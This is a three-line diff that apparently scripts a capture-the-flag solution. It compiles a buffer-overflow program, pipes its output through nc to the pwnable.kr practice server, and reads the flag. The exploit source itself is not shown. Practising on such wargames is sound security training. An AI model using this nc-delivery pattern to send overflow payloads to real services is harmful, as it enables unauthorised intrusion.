@@ -1,0 +1,3 @@
+cc bofFindOverflow.c -o overflow
+./overflow | nc pwnable.kr 9000
+cat flag
